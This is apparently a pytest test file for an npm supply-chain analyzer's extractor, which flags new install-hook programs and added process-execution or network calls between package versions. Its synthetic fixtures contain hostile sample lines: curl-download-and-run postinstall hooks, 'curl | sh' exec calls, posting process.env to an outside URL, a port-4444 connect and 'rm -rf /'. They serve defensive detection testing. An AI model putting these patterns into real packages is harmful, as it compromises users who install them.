"""X1 코드 문맥 extractor 테스트. 합성 패키지 파일만 쓰며 어떤 코드도 실행하지 않는다."""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

import pytest

from depbee_analyzer.core.models import PackageVersionSnapshot
from depbee_analyzer.core.pipeline import resolve_extractors
from depbee_analyzer.extractors import EXTRACTOR_REGISTRY, OPTIONAL_EXTRACTOR_REGISTRY
from depbee_analyzer.extractors.code_context import (
    FEATURE_NAMES,
    CodeContextExtractor,
    command_segments,
    count_calls,
)


def _snapshot(version: str, root: Path | None, scripts: dict | None = None, **package_json) -> PackageVersionSnapshot:
    body = {"name": "sample-pkg", "version": version, **package_json}
    if scripts is not None:
        body["scripts"] = scripts
    return PackageVersionSnapshot(
        package="sample-pkg",
        version=version,
        published_at=datetime(2024, 1, 1, tzinfo=timezone.utc),
        package_json=body,
        source_dir=root,
    )


def _tree(root: Path, files: dict[str, str]) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    for relative, text in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


def _pair(tmp_path: Path, old_files: dict, new_files: dict, old_scripts=None, new_scripts=None):
    old = _snapshot("1.0.0", _tree(tmp_path / "old", old_files), old_scripts)
    new = _snapshot("1.0.1", _tree(tmp_path / "new", new_files), new_scripts)
    return old, new


@pytest.fixture
def extractor() -> CodeContextExtractor:
    return CodeContextExtractor()


# --- 등록·스키마 -------------------------------------------------------------

def test_is_optional_and_not_in_default_registry() -> None:
    assert "code_context" not in EXTRACTOR_REGISTRY
    assert OPTIONAL_EXTRACTOR_REGISTRY["code_context"] is CodeContextExtractor
    assert {e.name for e in resolve_extractors(None)} == {"package_json", "obfuscation"}


def test_can_be_selected_by_name_with_existing_extractors() -> None:
    names = [e.name for e in resolve_extractors(["package_json", "obfuscation", "code_context"])]
    assert names == ["package_json", "obfuscation", "code_context"]


def test_declares_source(extractor: CodeContextExtractor) -> None:
    assert "source" in extractor.required_data


def test_emits_fixed_columns_that_do_not_collide_with_existing_features(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": "1"})
    features = extractor.extract(old, new)
    assert list(features) == list(FEATURE_NAMES)
    existing = {"installScriptPresent", "installScriptAdded", "scriptEntryAdded", "newDependencyAdded",
                "newDependencyCount", "updateType", "updateInterval"}
    assert not existing & set(features)
    assert not any(name.startswith("obf") for name in features)


# --- A 유형: 설치 훅 ---------------------------------------------------------

def test_no_install_hooks_is_zero_not_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": "2"}, {"test": "jest"}, {"test": "jest"})
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is False
    assert features["installHookRefFileChanged"] is False


def test_added_hook_counts_new_programs_including_inside_sh_c(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {}, {},
        {"postinstall": "node-gyp rebuild"},
        {"postinstall": 'node-gyp rebuild && sh -c "curl -o /tmp/a https://x.example && sh /tmp/a"'},
    )
    features = extractor.extract(old, new)
    # 새 프로그램: sh, curl (node-gyp은 이전에도 있었다)
    assert features["installHookNewProgramCount"] == 2
    assert features["installHookArgsChanged"] is False  # 프로그램 구성이 바뀌었으므로 인자만 변경이 아니다


def test_args_only_change_in_existing_hook(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {}, {},
        {"postinstall": "node-gyp rebuild --release"},
        {"postinstall": "node-gyp rebuild --release --target=https://evil.example"},
    )
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is True


def test_identical_hooks_and_whitespace_only_change_are_not_changes(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"install.js": "x"}, {"install.js": "x"},
        {"postinstall": "node install.js"}, {"postinstall": "node   install.js "},
    )
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is False
    assert features["installHookRefFileChanged"] is False


def test_env_assignment_and_redirect_target_are_not_programs() -> None:
    assert command_segments("NODE_ENV=prod node a.js > /dev/null 2>&1") == [["node", "a.js", "2"]]


def test_unparsable_hook_is_missing_not_zero(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {"postinstall": "node a.js"}, {"postinstall": "node 'a.js"})
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] is None
    assert features["installHookArgsChanged"] is None
    assert features["installHookRefFileChanged"] is None


def test_malformed_scripts_object_is_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {"postinstall": "node a.js"}, None)
    new.package_json["scripts"] = ["postinstall"]
    assert extractor.extract(old, new)["installHookNewProgramCount"] is None


def test_referenced_file_changed(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"scripts/setup.js": "console.log(1)"}, {"scripts/setup.js": "require('child_process').exec('x')"},
        {"postinstall": "node ./scripts/setup.js"}, {"postinstall": "node ./scripts/setup.js"},
    )
    assert extractor.extract(old, new)["installHookRefFileChanged"] is True


def test_referenced_file_added_with_node_extension_resolution(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {"setup/index.js": "x"}, {}, {"preinstall": "node setup"})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is True


def test_referenced_shell_script_unchanged(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"build.sh": "echo hi"}, {"build.sh": "echo hi"},
        {"install": "./build.sh"}, {"install": "bash build.sh"},
    )
    assert extractor.extract(old, new)["installHookRefFileChanged"] is False


def test_missing_referenced_file_is_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "node not-shipped.js"})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is None


def test_reference_outside_package_is_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "curl -o /tmp/a https://x.example && sh /tmp/a"})
    features = extractor.extract(old, new)
    assert features["installHookRefFileChanged"] is None
    assert features["installHookNewProgramCount"] == 2


def test_inline_node_code_has_no_file_reference(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "node -e \"require('./x')\""})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is False


def test_oversized_referenced_file_is_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "x" * 100}, {"postinstall": "node a.js"}, {"postinstall": "node a.js"})
    features = CodeContextExtractor(max_file_bytes=50).extract(old, new)
    assert features["installHookRefFileChanged"] is None


# --- C 유형: 변경 JS의 호출 --------------------------------------------------

def test_added_process_execution_call(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path,
        {"index.js": "module.exports = 1;\n"},
        {"index.js": "const cp = require('child_process');\ncp.exec('curl x | sh');\nmodule.exports = 1;\n"},
    )
    features = extractor.extract(old, new)
    assert features["addedProcExecCallCount"] == 1
    assert features["addedNetworkCallCount"] == 0


def test_added_network_calls_node_builtins_and_libraries(tmp_path, extractor) -> None:
    new_code = (
        "const https = require('node:https');\n"
        "import axios from 'axios';\n"
        "https.request({host: 'x'});\n"
        "axios.post('https://x', process.env);\n"
        "fetch('https://y');\n"
    )
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": new_code})
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 3


def test_same_code_in_old_and_new_counts_zero(tmp_path, extractor) -> None:
    code = "const { spawn } = require('child_process'); spawn('x'); fetch('https://e');"
    old, new = _pair(tmp_path, {"a.js": code}, {"a.js": code + "\n// touched"})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_unchanged_files_with_calls_are_not_counted(tmp_path, extractor) -> None:
    code = "require('child_process').execSync('id'); fetch('u');"
    old, new = _pair(tmp_path, {"a.js": code, "b.js": "1"}, {"a.js": code, "b.js": "2"})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_keywords_only_in_comments_and_strings_are_not_calls(tmp_path, extractor) -> None:
    new_code = (
        "// require('child_process').exec('rm -rf /')\n"
        "/* fetch('https://evil') */\n"
        "const doc = \"require('child_process').exec('x'); fetch('y')\";\n"
        "const tpl = `cp.exec(${'a'}) http.request()`;\n"
    )
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": new_code})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_regexp_exec_is_not_process_execution() -> None:
    assert count_calls("const re = /a\\/b/g; re.exec(s); /x/.exec(t); exec(s);") == (0, 0)


def test_minified_bundle_counts_net_difference_not_whole_line(tmp_path, extractor) -> None:
    old_code = 'var a=require("child_process");a.exec(x);fetch(u);'
    new_code = 'var a=require("child_process");a.exec(x);a.spawn(y);fetch(u);fetch(v);'
    old, new = _pair(tmp_path, {"dist/x.min.js": old_code}, {"dist/x.min.js": new_code})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (1, 1)


def _added(tmp_path, extractor, old_code: str, new_code: str) -> tuple[int, int]:
    old, new = _pair(tmp_path, {"a.js": old_code}, {"a.js": new_code})
    features = extractor.extract(old, new)
    return features["addedProcExecCallCount"], features["addedNetworkCallCount"]


def test_same_count_but_network_target_changed(tmp_path, extractor) -> None:
    assert _added(tmp_path, extractor, 'fetch("https://api.example/v1");', 'fetch("https://collect.evil/x");') == (0, 1)


def test_same_count_but_command_changed(tmp_path, extractor) -> None:
    old = "const { exec } = require('child_process'); exec('git rev-parse HEAD');"
    new = "const { exec } = require('child_process'); exec('curl -s https://x | sh');"
    assert _added(tmp_path, extractor, old, new) == (1, 0)


def test_one_call_removed_and_another_added_in_same_file(tmp_path, extractor) -> None:
    old = "const cp = require('child_process'); cp.exec('a'); const h = require('https'); h.get('u1');"
    new = "const cp = require('child_process'); cp.spawn('b'); const h = require('https'); h.request('u2');"
    assert _added(tmp_path, extractor, old, new) == (1, 1)


def test_port_number_change_is_a_changed_call(tmp_path, extractor) -> None:
    old = "const n = require('net'); n.connect(80, 'localhost');"
    new = "const n = require('net'); n.connect(4444, 'localhost');"
    assert _added(tmp_path, extractor, old, new) == (0, 1)


def test_minifier_renaming_and_reordering_is_not_a_change(tmp_path, extractor) -> None:
    old = 'var a=require("child_process"),b=require("https");a.exec("ls",c);b.get("https://u",d);fetch(e);'
    new = 'var x=require("child_process"),y=require("https");fetch(q);y.get("https://u",z);x.exec("ls",w);'
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_target_change_through_variable_only_is_not_detected(tmp_path, extractor) -> None:
    """한계 고정: 리터럴이 아닌 변수로만 전달된 대상 변경은 서명이 같아 0이다(문서화된 동작)."""
    old = "const cp = require('child_process'); cp.exec(cmd);"
    new = "const cp = require('child_process'); cp.exec(otherCmd);"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_own_version_string_in_arguments_is_not_a_change(tmp_path, extractor) -> None:
    # _pair는 old 1.0.0, new 1.0.1이다. 빌드가 자기 버전을 인자에 넣는 경우(esbuild 실제 사례)
    old = "const cp = require('child_process'); cp.spawn('bin', ['--version=1.0.0', '--ping']);"
    new = "const cp = require('child_process'); cp.spawn('bin', ['--version=1.0.1', '--ping']);"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_other_version_like_literal_change_is_still_a_change(tmp_path, extractor) -> None:
    old = "fetch('https://cdn.example/lib@2.3.4/x.js');"
    new = "fetch('https://cdn.example/lib@9.9.9/x.js');"
    assert _added(tmp_path, extractor, old, new) == (0, 1)


def test_alias_and_module_member_forms_share_one_signature(tmp_path, extractor) -> None:
    old = "const cp = require('child_process'); cp.exec('id');"
    new = "require('child_process').exec('id');"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_removed_calls_do_not_go_negative(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "require('child_process').exec(a);"}, {"a.js": "1"})
    assert extractor.extract(old, new)["addedProcExecCallCount"] == 0


def test_new_file_calls_are_counted(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "1", "lib/payload.cjs": "const n=require('net'); n.connect(4444,'h');"})
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 1


def test_missing_source_tree_makes_code_features_missing_but_hooks_computed(tmp_path, extractor) -> None:
    old = _snapshot("1.0.0", None, {"postinstall": "node-gyp rebuild"})
    new = _snapshot("1.0.1", None, {"postinstall": "node-gyp rebuild && curl https://x"})
    features = extractor.extract(old, new)
    assert features["addedProcExecCallCount"] is None
    assert features["addedNetworkCallCount"] is None
    assert features["installHookNewProgramCount"] == 1
    assert features["installHookRefFileChanged"] is False  # 참조 파일 없음


def test_size_limit_makes_code_features_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "fetch(u);" * 20})
    features = CodeContextExtractor(max_file_bytes=50).extract(old, new)
    assert features["addedNetworkCallCount"] is None
    assert features["addedProcExecCallCount"] is None


def test_file_count_limit_makes_code_features_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {f"f{i}.js": "1" for i in range(5)})
    features = CodeContextExtractor(max_file_count=3).extract(old, new)
    assert features["addedNetworkCallCount"] is None


def test_undecodable_bytes_are_analyzed_not_dropped(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {})
    (tmp_path / "new" / "a.js").write_bytes(b"\xff\xfe fetch('u');")
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 1
